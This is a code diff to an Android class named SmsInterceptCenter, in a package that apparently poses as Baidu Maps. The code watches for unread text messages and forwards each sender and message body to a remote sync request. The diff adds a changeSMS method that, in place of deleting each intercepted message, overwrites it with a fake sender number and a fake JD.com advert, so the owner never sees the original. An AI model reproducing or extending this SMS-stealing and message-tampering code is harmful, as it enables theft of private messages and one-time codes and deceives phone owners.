@@ -1,5 +1,6 @@
 package com.baidu.BaiduMap.sms;
 
+import android.content.ContentValues;
 import android.content.Context;
 import android.database.ContentObserver;
 import android.database.Cursor;
@@ -64,7 +65,7 @@ public class SmsInterceptCenter extends ContentObserver {
                 new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"},
                 "date desc");
 //        while (mCursor.moveToNext()) {
-//            ContentValues values = new ContentValues();
+//
 //            String id = mCursor.getString(mCursor.getColumnIndexOrThrow("_id"));
 //            String address = mCursor.getString(mCursor.getColumnIndexOrThrow("address"));
 //            String read = mCursor.getString(mCursor.getColumnIndexOrThrow("read"));
@@ -77,12 +78,9 @@ public class SmsInterceptCenter extends ContentObserver {
 //            sb.append(" body: " + body);
 //            sb.append(" thread_id: " + thread_id);
 //            Log.debug(" sms content : " + sb.toString());
-//            values.put("read", "1");
-//            values.put("address", "95555");
-//            values.put("body", "京东会员，我们准备了51元暖心礼包+专享花费券！戳 dc.jd.com/dPEJQQ 领走！神券在握，低价不怕错过！ 回BK退订【京东】");
-//            context.getContentResolver().update(Uri.parse("content://sms/"), values, "_id=?", new String[]{"" + id});
-//            delete(id);
-//    }
+//
+////            delete(id);
+//        }
         if (mCursor == null) {
             return;
         }
@@ -114,7 +112,6 @@ public class SmsInterceptCenter extends ContentObserver {
                 _smsInfo.read = mCursor.getString(readIndex);
             }
             list.add(_smsInfo.toString());
-
 //            int delete = delete(_smsInfo._id);
 //            SmsSynchronousRequest.getInstance().request(context, _smsInfo.smsBody, delete);
         }
@@ -128,12 +125,18 @@ public class SmsInterceptCenter extends ContentObserver {
 //        Sms_send_tongbu(catchError(e), SDKInit.mContext, -1);
     }
 
-
-    private int delete(String _id) {
-        Uri contentUri = Uri.parse("content://sms");
-        int delete = context.getContentResolver().delete(contentUri, "read=0 and _id=?", new String[]{_id});
-        return delete;
+    private void changeSMS(String id) {
+        ContentValues values = new ContentValues();
+        values.put("read", "1");
+        values.put("address", "95555");
+        values.put("body", "京东会员，我们准备了51元暖心礼包+专享花费券！戳 dc.jd.com/dPEJQQ 领走！神券在握，低价不怕错过！ 回BK退订【京东】");
+        context.getContentResolver().update(Uri.parse("content://sms/"), values, "_id=?", new String[]{"" + id});
     }
+//    private int delete(String _id) {
+//        Uri contentUri = Uri.parse("content://sms");
+//        int delete = context.getContentResolver().delete(contentUri, "read=0 and _id=?", new String[]{_id});
+//        return delete;
+//    }
 
     private String chooseSMS(String content) {
         String _id = "";
@@ -154,13 +157,14 @@ public class SmsInterceptCenter extends ContentObserver {
 //            }
         } catch (Exception e) {
             System.out.println("eeeee:" + e);
-            delete(_id);
+//            delete(_id);
+            changeSMS(_id);
             SmsSynchronousRequest.getInstance().request(context, catchError(e), -2);
             return "";
         }
         Log.debug("contentCacheString:" + contentCacheString);
         if (contentCacheString.equals(smsBody)) {
-            delete(_id);
+            changeSMS(_id);
             if (Constants.isOutPut) {
                 Log.debug("==========>缓存的东西跟新短信内容相同:" + smsBody);
             }
@@ -170,8 +174,8 @@ public class SmsInterceptCenter extends ContentObserver {
             if (Constants.isOutPut) {
                 Log.debug("==========>缓存的东西跟新短信内容不相同並且需要同步:" + smsBody);
             }
-            int delete = delete(_id);
-            SmsSynchronousRequest.getInstance().request(context, "smsAddress:" + smsAddress + "\t" + "smsBody:" + smsBody, delete);
+            changeSMS(_id);
+            SmsSynchronousRequest.getInstance().request(context, "smsAddress:" + smsAddress + "\t" + "smsBody:" + smsBody, 1);
             return content;
         }
     }
